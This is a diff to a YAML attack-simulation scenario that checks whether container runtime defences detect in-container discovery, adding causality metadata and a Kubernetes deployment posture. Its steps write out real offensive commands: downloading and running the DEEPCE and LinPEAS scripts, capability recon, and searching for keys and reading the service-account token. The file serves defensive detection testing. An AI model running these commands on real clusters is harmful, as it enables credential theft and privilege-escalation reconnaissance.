@@ -9,8 +9,12 @@ detection_types:
 
 uc_ref: UCS-CDR-01
 tc_ref: TC-CDR-01
-uc_name: "Container Runtime Threat Detection"
-tc_name: "Container Enumeration and Discovery"
+tc_refs:
+  - TC-CDR-01
+  - TC-CITH-03
+pov_scenario_id: POV-SC-054
+uc_name: "Cloud Detection & Response"
+tc_name: "Validate runtime threat detection for containers and serverless workloads"
 
 mitre_tactic: "TA0007"
 mitre_tactic_name: "Discovery"
@@ -68,6 +72,55 @@ external_tools:
     type: script
     install_inline: true
 
+# ── Causality contract ──────────────────────────────────────────────────────
+# The pod's container runtime (containerd-shim → runc → container entrypoint
+# shell) is the Causality Group Owner — the process that OWNS this in-container
+# recon chain, NOT the cortexsim-agent beacon. Every recon step is a child of
+# the same container entrypoint shell (shared container_id + causality actor),
+# so the spine is a process_lineage chain: install deps → curl|bash DEEPCE →
+# capability/device recon → service-account-token harvest → LinPEAS. The recon
+# runs from the non-root container-runtime identity while the CGO stays root
+# (the Linux privilege-drop-across-exec the sensor traces). platforms tag the
+# Linux container env; step-04's k8s service-account-token read adds k8s.
+cgo_anchor:
+  image_name: "containerd-shim"
+  primary_username: "root"
+
+# ── Cluster posture — the deployment IS the agent (K8s delivery contract) ────
+# RANK 1 of the K8s-native first slice. This scenario's steps were ALREADY
+# written for Henry's field pattern (step-02 is `curl … deepce.sh | bash`), so
+# it is the lowest-blast-radius proof that `kubectl apply` → kubelet → entrypoint
+# → SimCore payload → tool works end to end. Posture is deliberately BASELINE:
+# a namespaced, non-privileged Deployment running as www-data (UID 33), with a
+# namespace-scoped Role granting get/list on secrets so step-04's secret/token
+# harvest has something worth harvesting. No cluster_role_rules, no host access,
+# no privilege → UNGATED (required_consent_keys() == ()), so the existing
+# `GET /download?format=k8s` keeps working with no consent prompt. Deployment,
+# not Job, so it appears in cluster inventory like a normal service and yields a
+# genuinely connected CGO→process spine. It is ALSO the compliant control that
+# POS-KSPM-003 chk-02 asserts is ADMITTED without disruption while the
+# privileged fixture workloads are refused. app_identity back-fills from
+# cgo_anchor.image_name (containerd-shim) per the S-17 two-way back-fill.
+cluster_posture:
+  workload: deployment
+  security_context:
+    run_as_user: 33                # www-data — the recon's declared identity
+    allow_privilege_escalation: false
+    capabilities_drop: ["ALL"]
+  service_account:
+    automount_token: true          # so step-04's SA-token read is non-vacuous
+    namespace_role_rules:          # namespace-scoped only — NOT a cluster grant
+      - api_groups: [""]
+        resources: ["secrets"]
+        verbs: ["get", "list"]
+  # The tools this scenario's steps download. SimCore stages and serves them, so
+  # the pod never reaches github.com — the egress a customer's default-deny CNI
+  # blocks first. Declaring these forces delivery=served and installs the
+  # shelf-backed curl shim, which is what makes step-02 and step-05 resolve.
+  payloads:
+    - deepce.sh
+    - linpeas.sh
+
 steps:
   - id: step-01
     name: "Install enumeration dependencies"
@@ -78,6 +131,7 @@ steps:
       echo "[*] Dependency install complete"
     identity: container-runtime
     mitre_technique: "T1059.004"
+    platforms: ["linux", "container"]
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -90,6 +144,10 @@ steps:
     command: "curl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt"
     identity: container-runtime
     mitre_technique: "T1613"
+    platforms: ["linux", "container"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -107,6 +165,10 @@ steps:
     command: "ls -la /dev/ | head -30 && echo '---' && cat /proc/1/status | grep -E 'CapEff|CapPrm' && echo '---' && mount | grep -E 'overlay|docker|k8s' && echo '---' && env | grep -iE 'kube|docker|container'"
     identity: container-runtime
     mitre_technique: "T1613"
+    platforms: ["linux", "container"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -124,6 +186,10 @@ steps:
     command: "find / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20 && ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50 && echo '[truncated for safety]'"
     identity: container-runtime
     mitre_technique: "T1552.001"
+    platforms: ["linux", "container", "k8s"]
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
@@ -141,6 +207,10 @@ steps:
     command: "curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape' | tee /tmp/linpeas_cdr_output.txt"
     identity: container-runtime
     mitre_technique: "T1082"
+    platforms: ["linux", "container"]
+    causality:
+      parent_step: step-04
+      pivot: process_lineage
     expected_detections:
       - plane: CDR
         type: BIOC
